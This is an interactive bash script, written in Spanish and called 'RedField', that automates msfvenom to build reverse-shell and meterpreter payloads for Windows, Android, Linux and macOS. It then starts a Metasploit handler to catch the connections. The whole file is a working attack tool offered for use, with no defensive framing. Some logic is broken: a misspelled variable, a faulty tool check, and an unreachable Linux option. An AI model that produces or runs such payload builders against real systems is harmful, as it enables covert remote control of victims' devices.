#!/bin/bash


#Script para automatizar creacion de carga útil


#Colores

Negro='\033[1;30m'        # Negro
Rojo='\033[1;31m'         # Rojo
Verde='\033[1;32m'        # Verde
Amariilo='\033[1;33m'     # Amarillo
Azul='\033[1;34m'         # Azul
Morado='\033[1;35m'       # Morado
Cyan='\033[1;36m'         # Cyan
Blanco='\033[1;37m'       # Blanco
Nada="\033[0m\e[0m"       # Término de color

clear



menu(){
echo "-----------------------------------------------"
echo -e "${Verde}RedField: Automatizar creación de carga útil${Nada}" 
echo -e "${Amarillo}Creado por https://criminalminds.github.io/${Nada}" 
echo "-----------------------------------------------"
}

# Chequear usuario r00t

if [ $(id -u) -ne "0" ]; then

        echo -e "${Azul}Es necesario ser ${Rojo}root${Nada} ${Azul}para poder ejecutar este script${Nada}"
        echo -e "${Azul}sudo ./redfield${Nada}"

        exit
fi 

# Menú para elegir opciones de carga útiles mediante distintos tipos de sistemas operativos

menu
echo "Escoge la carga útil que quieras generar"
echo -e "${Rojo}[1]${Nada} Windows"
echo -e "${Rojo}[2]${Nada} Android"
echo -e "${Rojo}[3]${Nada} Linux"
echo -e "${Rojo}[4]${Nada} MacOS"
echo "-----------------------------------------------"
read OS

sleep 0.5

# Chequeando si están las herramientas necesarias

echo -e "${Morado}Revisando si están las herramientas necesarias para usar este script...${Nada}"

checkmsfvenom=$(which msfvenom) || $(ps aux | grep "msfvenom" | head -n1) 2>/dev/null

if [ "$?" -eq "0" ]; then
        echo -e "${Morado}Todo OK...${Nada}"
else
        echo "Herramientas necesarias no encontradas, intenta con: "
        echo "sudo apt-get install msfvenom"
        exit
fi

#Sacar ip para config inicial

iplocal=$(sudo ifconfig | head -n2 | tail -n 1 | awk '{print $2}')

#Config carga útil

echo -e "${Amarillo}Configuración carga útil...${Nada}"
read -p "Ingresa la ip (Tu ip local $iplocal): " ip 
read -p "Ingresa el puerto: " puerto
read -p "Ingresa el nombre final para la carga útil: " nombre
read -p "Ingresa la arquitectura (x86/x64): " arch

#Funciones para las opciones principales

windows(){
clear
menu
echo "Lista de cargas útiles para Windows"
echo "-----------------------------------"
 
echo -e "${Verde}[1]${Nada} windows/meterpreter/reverse_tcp "
echo -e "${Verde}[2]${Nada} windows/meterpreter/reverse_http  "
echo -e "${Verde}[3]${Nada} windows/meterpreter/reverse_https "
echo "-----------------------------------"
read tipo

 if [ $tipo -eq "1" ]; then
	
	if [ $arch == "x86" ]; then
	
	echo -e "${Rojo}Elegiste windows/meterpreter/reverse_tcp${Nada}"
	sleep 1
	echo "Generando carga útil..."

	msfvenom -p windows/meterpreter/reverse_tcp -a $arch LHOST=$ip LPORT=$puerto -f exe > $nombre.exe

	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	sleep 0.5
	handler

	else
	
	echo -e "${Rojo}Elegiste windows/x64/meterpreter/reverse_tcp${Nada}"
	sleep 1 
	echo "Generando carga útil..."

	msfvenom -p windows/x64/meterpreter/reverse_tcp -a $arch LHOST=$ip LPORT=$puerto -f exe > $nombre.exe


	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	sleep 0.5
	handler
	fi

elif [ $tipo -eq "2" ]; then 

	echo -e "${Rojo}Elegiste windows/meterpreter/reverse_http${Nada}"
	sleep 1
	echo "Generando carga útil..."


	msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$puerto -f exe > $nombre.exe

	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	sleep 0.5
	handler

elif [ $tipo -eq "3" ]; then

	echo -e "${Rojo}Elegiste windows/meterpreter/reverse_https${Nada}"
	sleep 1 
	echo "Generando carga útil..."

	msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$puerto -f exe > $nombre.exe

	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	sleep 0.5
	handler

 fi
}

android(){

clear
menu
echo "Lista de cargas útiles para Android"
echo "-----------------------------------"

echo -e "${Verde}[1]${Nada} android/meterpreter/reverse_tcp "
echo -e "${Verde}[2]${Nada} android/meterpreter/reverse_http  "
echo -e "${Verde}[3]${Nada} android/meterpreter/reverse_https "
echo "-----------------------------------"
read tipoandroid

 if [ $tipoandroid -eq "1" ]; then

	echo -e "${Rojo}Elegiste android/meterpreter/reverse_tcp${Nada} "
	sleep 1
	echo "Generando carga útil..."

	msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto  > $nombre.apk

	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	sleep 0.5
	handler

elif [ $tipoandroid -eq "2" ]; then 

	echo -e "${Rojo}Elegiste android/meterpreter/reverse_http${Nada}"
	sleep 1
	echo "Generando carga útil..."


	msfvenom -p android/meterpreter/reverse_http LHOST=$ip LPORT=$puerto > $nombre.apk

	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	sleep 0.5
	handler

elif [ $tipoandroid -eq "3" ]; then

	echo -e "${Rojo}Elegiste android/meterpreter/reverse_https${Nada}"
	sleep 1 
	echo "Generando carga útil..."

	msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$puerto > $nombre.apk

	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	sleep 0.5
	handler

 fi
}


linux(){

clear
menu
echo "Lista de cargas útiles para Linux"
echo "-----------------------------------"

echo -e "${Verde}[1]${Nada} linux/meterpreter/reverse_tcp "
echo -e "${Verde}[2]${Nada} linux/meterpreter/reverse_http  "
echo "-----------------------------------"
read tipolinux

 if [ $tipolinux -eq "1" ]; then
	
	if [ $arch == "x86" ]; then
	
	echo -e "${Rojo}Elegiste linux/x86/meterpreter/reverse_tcp${Nada} "
	sleep 1
	echo "Generando carga útil..."

	msfvenom -p linux/x86/meterpreter/reverse_tcp -a $arch LHOST=$ip LPORT=$puerto -f elf > $nombre.elf

	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	else
	echo -e "${Rojo}Elegiste linux/x64/meterpreter/reverse_tcp${Nada} "
	sleep 1
	echo "Generando carga útil..."

	msfvenom -p linux/x64/meterpreter/reverse_tcp -a $arch LHOST=$ip LPORT=$puerto -f elf > $nombre.elf

	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	sleep 0.5
	handler
	fi

if [ $tipolinux -eq "2" ]; then

	if [ $arch == "x86" ]; then

	echo -e "${Rojo}Elegiste linux/x86/meterpreter/reverse_http${Nada}"
	sleep 1
	echo "Generando carga útil..."

	msfvenom -p linux/x86/meterpreter_reverse_http -a $arch LHOST=$ip LPORT=$puerto -f elf > $nombre.elf

	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	sleep 0.5
	handler
	else

	echo -e "${Rojo}Elegiste linux/x64/meterpreter/reverse_http${Nada}"
	sleep 1
	echo "Generando carga útil..."

	msfvenom -p linux/x64/meterpreter_reverse_http -a $arch LHOST=$ip LPORT=$puerto -f elf > $nombre.elf

	echo -e "${Verde}Carga útil generada exitosamente${Nada}"
	sleep 0.5
	handler
	fi
fi
 fi
}

macos(){

clear
menu
echo "Lista de cargas útiles para MacOS"
echo "-----------------------------------"

echo -e "${Verde}[1]${Nada} osx/shell_reverse_tcp "
echo "-----------------------------------"
read tipomacos

if [ $tipomacos -eq "1" ]; then 
	echo -e "${Rojo}Elegiste osx/x86/shell_reverse_tcp${Nada}"
	sleep 1
	echo "Generando carga útil..."

	msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$puerto -f macho > $nombre.macho

	echo -e "${Verde}Carga útil generada exitosamente${Nada}" 
	sleep 0.5
	handler

	sleep 1
	

fi

}

handler(){

echo "Te gustaría iniciar el handler? (SI/NO) "
read elige

	if [ $elige == "SI" ]; then
read -p "Ingresa el payload que elegiste (ej: osx/x86/shell_reverse_tcp): " payload
echo -e "${Verde}Iniciando handler...${Nada}"

msfconsole -q -x "use multi/handler; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $puerto ; exploit "   # # #  Crear variable payload y añadirla a este comando
													    # # #  para que ponga la carga útil que eligió el usuario
	else

	echo -e "${Rojo}Ok, saliendo...${Nada}"
	fi
}



case $OS in

          1)
          windows;;


          2)
          android;;


          3)
          linux;;

	  4)
	  macos;;

          *)
          echo -e "Opción inválida"
          sleep 1
          echo -e "Saliendo..."
          exit ;;
esac
